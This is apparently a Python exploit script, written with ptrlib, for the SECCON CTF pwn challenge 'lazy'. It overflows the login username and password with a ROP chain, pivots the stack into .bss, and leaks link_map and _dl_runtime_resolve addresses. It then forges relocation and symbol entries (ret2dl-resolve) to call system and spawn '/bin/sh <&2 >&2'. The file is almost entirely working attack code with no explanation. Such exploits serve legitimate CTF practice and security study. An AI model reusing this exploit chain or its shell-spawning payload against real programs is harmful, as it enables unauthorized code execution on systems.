from ptrlib import *

elf = ELF("./lazy")
sock = Process("./lazy")
#sock = Socket("lazy.chal.seccon.jp", 33333)

def login_user(username):
    sock.sendlineafter("Exit\n", "2")
    sock.sendlineafter(": ", username)
    sock.recvuntil(", ")
    sock.recvline()
    output = sock.recvline()
    return output
def login_pass(password):
    sock.sendlineafter(": ", password)
    return

addr_dynsym = 0x0000000000400388
addr_dynstr = 0x0000000000400688
#addr_relplt = 0x0000000000400810
addr_relplt = 0x0000000000400ae0
addr_plt = 0x0000000000400b20
addr_got = 0x0000000000601f08
addr_bss = 0x0000000000602020
addr_dt_debug = 0x601e10

size_bulkread = 0x800

rop_pop_rdi = 0x004015f3
rop_pop_rsi_r15 = 0x004015f1
rop_popper = 0x4015e6
rop_csu_init = 0x4015d0
rop_leave_ret = 0x00400d70
base_stage = elf.section(".bss") + 0x800

# leak flag
username = b'A' * (0x5f + 0x58)
login_user(username)
password  = b'3XPL01717'
password += b'A' * (0x20 - len(password))
password += b'_H4CK3R_'
password += b'A' * (0x40 - len(password))
password += b'3XPL01717'
password += b'A' * (0x60 - len(password))
password += b'_H4CK3R_'
password += b'A' * (0x80 - len(password))
password += p64(0xdeadbeef)
#
password += p64(rop_popper)
password += p64(0)
password += p64(0)
password += p64(1)
password += p64(elf.got("read"))
password += p64(1200)
password += p64(base_stage)
password += p64(0)
password += p64(rop_csu_init)
password += p64(0) * 2
password += p64(base_stage)
password += p64(0) * 4
password += p64(rop_leave_ret)
login_pass(password)

# dt_debug
addr_esp = base_stage + 8
payload = p64(rop_pop_rdi + 1)
payload += p64(rop_popper)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("write"))
payload += p64(8)
payload += p64(addr_dt_debug)
payload += p64(1)
payload += p64(rop_csu_init)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("read"))
payload += p64(8)
payload += p64(addr_esp + 8 * 22)
payload += p64(0)

# r_debug & link_map
addr_esp += 8 * 16
payload += p64(rop_csu_init)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("write"))
payload += p64(size_bulkread)
payload += p64(0)
payload += p64(1)
payload += p64(rop_csu_init)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("read"))
payload += p64(8)
payload += p64(addr_esp + 8 * 22)
payload += p64(0)

# link_map_lib
addr_esp += 8 * 16
payload += p64(rop_csu_init)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("write"))
payload += p64(40)
payload += p64(0)
payload += p64(1)
payload += p64(rop_csu_init)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("read"))
payload += p64(8)
payload += p64(addr_esp + 8 * 22)
payload += p64(0)

# link_map_lib2
addr_esp += 8 * 16
payload += p64(rop_csu_init)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("write"))
payload += p64(40)
payload += p64(0)
payload += p64(1)
payload += p64(rop_csu_init)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("read"))
payload += p64(8)
payload += p64(addr_esp + 8 * 22)
payload += p64(0)

# lib_dynamic & lib_gotplt
addr_esp += 8 * 16
payload += p64(rop_csu_init)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("write"))
payload += p64(size_bulkread)
payload += p64(0)
payload += p64(1)
payload += p64(rop_csu_init)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("read"))
payload += p64(8)
payload += p64(addr_esp + 8 * 22)
payload += p64(0)

# overwrite dt_versym
addr_esp += 8 * 16
payload += p64(rop_csu_init)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("read"))
payload += p64(8)
payload += p64(0)
payload += p64(0)
payload += p64(rop_csu_init)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("read"))
payload += p64(0x18)
payload += p64(addr_esp + 8 * 32)
payload += p64(0)

addr_esp += 8 * 16
addr_reloc = addr_esp + 8 * 20
align_reloc = 0x18 - ((addr_reloc - addr_relplt) % 0x18)
addr_reloc += align_reloc
addr_sym = addr_reloc + 24
align_dynsym = 0x18 - ((addr_sym - addr_dynsym) % 0x18)
addr_sym += align_dynsym
addr_symstr = addr_sym + 24
addr_cmd = addr_symstr + 7

reloc_offset = (addr_reloc - addr_relplt) // 0x18
r_info = (((addr_sym - addr_dynsym) // 0x18) << 32) | 0x7
st_name = addr_symstr - addr_dynstr
payload += p64(rop_csu_init)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(base_stage)
payload += p64(0)
payload += p64(0)
payload += p64(addr_cmd)
payload += p64(rop_csu_init)
payload += p64(0) * 7
payload += p64(0xdeadbeef) * 2
payload += p64(reloc_offset)
payload += p64(0xdeadbeef)
payload += b'A' * align_reloc
payload += p64(addr_bss)
payload += p64(r_info)
payload += p64(0)
payload += b'A' * align_dynsym
payload += p32(st_name) + p32(0x12)
payload += p64(0) * 2
payload += b'system\x00'
payload += b'/bin/sh <&2 >&2\x00'
sock.send(payload)

addr_r_debug = u64(sock.recv(8))
logger.info("addr_r_debug = " + hex(addr_r_debug))
sock.send(p64(addr_r_debug))

data = sock.recv(size_bulkread)
addr_link_map = u64(data[8:16])
offset = addr_link_map - addr_r_debug
addr_link_map_lib = u64(data[offset + 24:offset + 32])
sock.send(p64(addr_link_map_lib))
logger.info("addr_link_map = " + hex(addr_link_map))
logger.info("addr_link_map_lib = " + hex(addr_link_map_lib))

data = sock.recv(40)
addr_link_map_lib2 = u64(data[24:32])
sock.send(p64(addr_link_map_lib2))
logger.info("addr_link_map_lib2 = " + hex(addr_link_map_lib2))

data = sock.recv(40)
addr_lib_dynamic = u64(data[16:24])
sock.send(p64(addr_lib_dynamic))
logger.info("addr_lib_dynamic = " + hex(addr_lib_dynamic))

data = sock.recv(size_bulkread)
addr_lib_gotplt = u64(data.split(b'\x03\x00\x00\x00\x00\x00\x00\x00')[1][:8])
offset = addr_lib_gotplt - addr_lib_dynamic
addr_dl_resolve = u64(data[offset+16:offset+24])
sock.send(p64(addr_link_map + 0x1c8))
logger.info("addr_lib_gotplt = " + hex(addr_lib_gotplt))
logger.info("addr_dl_resolve = " + hex(addr_dl_resolve))

sock.send(p64(0))
input()
sock.send(p64(addr_dl_resolve) + p64(addr_link_map))

sock.interactive()
